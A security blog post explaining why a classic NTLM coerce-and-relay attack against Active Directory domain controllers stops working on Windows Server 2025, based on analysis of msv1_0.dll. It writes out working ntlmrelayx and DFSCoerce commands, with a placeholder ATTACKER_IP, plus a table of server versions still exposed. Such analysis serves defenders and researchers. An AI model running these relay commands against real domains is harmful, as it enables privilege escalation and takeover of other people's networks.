---
title: What Windows Server 2025 Quietly Did to Your NTLM Relay
url: https://decoder.cloud/2026/02/25/what-windows-server-2025-quietly-did-to-your-ntlm-relay/
source: Over Security - Cybersecurity news aggregator
date: 2026-02-25
fetch_date: 2026-02-26T04:11:47.883661
---

# What Windows Server 2025 Quietly Did to Your NTLM Relay

# [Decoder's Blog](https://decoder.cloud/ "Decoder's Blog")

Decoder's Blog

[Skip to content](#content "Skip to content")

* [Home](/)
* [Decoder’s Blog](https://decoder.cloud/)
* [Contact](https://decoder.cloud/contact/)

Search for:

Posted on [February 25, 2026February 25, 2026](https://decoder.cloud/2026/02/25/what-windows-server-2025-quietly-did-to-your-ntlm-relay/) by [Decoder](https://decoder.cloud/author/decoderblogblog/)

# What Windows Server 2025 Quietly Did to Your NTLM Relay

## TL;DR

This post is super short, nevertheless:

The classic cross-DC coerce + relay to LDAPS technique, abusing a misconfigured LmCompatibilityLevel (0/1/2) to generate NTLMv1 + ESS and strip the MIC, is dead when the victim DC runs Windows Server 2025.

And it’s not just a policy change.

It’s hardcoded in msv1\_0.dll.

## Disclaimer

I’m not 100% sure nobody has already published or blogged about this specific finding. I did some research and couldn’t find anything covering this tpic, but if someone has already documented this , kudos to them 😉 , and sorry for the duplication. I’m sharing it because I think it’s useful and I haven’t seen it written up this way anywhere.

## The Classic Attack

If you’ve done Active Directory pentesting or red teaming in the last few years, you probably know this one by heart.

**Scenario:**
We have at least two domain controllers. One of them, **DC2**, has *LmCompatibilityLevel misconfigured* **(< 3)**.

That gives us an opening.

We can run:

```
ntlmrelayx.py -t ldaps://DC1 -smb2support --shadow-credentials --remove-mic
```

Then coerce DC2 to authenticate to us:

```
DFSCoerce.py -u <user> -p <pass> -d <domain> DC2 ATTACKER_IP
```

DC2 is coerced into authenticating to our attacker machine.

An **NTLMv1 + ESS AUTHENTICATE** message hits our `ntlmrelayx`.
We strip the MIC using `--remove-mic`, relay it to **DC1 over LDAPS**, and modify sensitive attributes on DC2’s computer object:

* Write `msDS-KeyCredentialLink` (Shadow Credentials)
* Add RBCD
* Or any other relay-based privilege escalation

**Game over.**

![](https://decoder.cloud/wp-content/uploads/2026/02/image-16.png?w=1024)

This worked reliably when the coerced Domain Controller versions was <= 2022

It does not work when the coerced Domain Controller is 2025:

![](https://decoder.cloud/wp-content/uploads/2026/02/image-18.png?w=1024)

Let me explain, based on my analysis, why, at the code level.

## What Changed in Server 2025

Diffing `msv1_0.dll` between Server 2022 and Server 2025 (thanks also to Claude 🙂 ) reveals an interesting change to kill this attack.

* Fixed level in`NtLmGlobalLmProtocolSupported`

In `MspLm20GetChallengeResponse`, the code that determines what type of authentication response to generate, Server 2025 added this:

![](https://decoder.cloud/wp-content/uploads/2026/02/image-15.png?w=1008)

This means if you had `LmCompatibilityLevel=0` or `1` or 2 in the registry on a 2025 DC, it would still generate NTLMv2:

![](https://decoder.cloud/wp-content/uploads/2026/02/image-17.png?w=1024)

Note that in case of an NTLMv1 response, the size is fixed to 24.

What does this mean?

A Win2025 machine **will never generate NTLMv1 as a clien**t, regardles of the `LmCompatibilityLevel` configured in registry.

Also notable: the default value of *`NtLmGlobalLmProtocolSupported`* changed from **3** in 2022 to **4** in 2025.

This hopefully should explain why this relay attack stopped workig in 2025 (at least starting from *2024-09 2024-09 Cumulative Update for Windows 11 Version 24H2 for arm64-based Systems (KB5043080)* )

In Server 2022 the registry value was used directly.

## The surviving attack surface

The table summarizes the exploitable attack surface based on the Server versions:

|  |  |  |  |
| --- | --- | --- | --- |
| **DC Victim** | **DC Target** | **Victim LmCompatibilityLevel** | **LDAPS Chanel Binding** |
| Server version <=2022 | Server version <=2022 | 0,1,2 | NOT required |
| Server version <=2022 | Server Version 2025 | 0,1,2 | NOT required |

The **–remove-mic** with NTLMv1+ESS still works across all versions.

But hey, we’re all abandoning NTLM very soon anyway.
At least that’s what Microsoft keeps telling us.

So who cares?

That’s all 😉

### Share this:

* [Share on X (Opens in new window)
  X](https://decoder.cloud/2026/02/25/what-windows-server-2025-quietly-did-to-your-ntlm-relay/?share=twitter)
* [Share on Facebook (Opens in new window)
  Facebook](https://decoder.cloud/2026/02/25/what-windows-server-2025-quietly-did-to-your-ntlm-relay/?share=facebook)

Like Loading...

# Post navigation

[Previous Article Reflecting Your Authentication: When Windows Ends Up Talking to Itself](https://decoder.cloud/2025/11/24/reflecting-your-authentication-when-windows-ends-up-talking-to-itself/)

### Leave a comment [Cancel reply](/2026/02/25/what-windows-server-2025-quietly-did-to-your-ntlm-relay/#respond)

Δ

## Search

Search for:

[Blog at WordPress.com.](https://wordpress.com/?ref=footer_blog)

* [Facebook](http://www.facebook.com)
* [LinkedIn](http://www.linkedin.com)
* [Twitter](http://www.twitter.com)
* [Instagram](http://www.instagram.com)

Privacy & Cookies: This site uses cookies. By continuing to use this website, you agree to their use.

* [Comment](https://decoder.cloud/2026/02/25/what-windows-server-2025-quietly-did-to-your-ntlm-relay/#respond)
* Reblog
* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png?m=1479929237i) Decoder's Blog](https://decoder.cloud)

  Join 42 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fdecoder.cloud%252F2026%252F02%252F25%252Fwhat-windows-server-2025-quietly-did-to-your-ntlm-relay%252F)
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png?m=1479929237i) Decoder's Blog](https://decoder.cloud)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fdecoder.cloud%252F2026%252F02%252F25%252Fwhat-windows-server-2025-quietly-did-to-your-ntlm-relay%252F)
  + [Copy shortlink](https://wp.me/p8ggv8-7Er)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://decoder.cloud/2026/02/25/what-windows-server-2025-quietly-did-to-your-ntlm-relay/)
  + [View post in Reader](https://wordpress.com/reader/blogs/122087370/posts/29415)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

%d

![](https://pixel.wp.com/b.gif?v=noscript)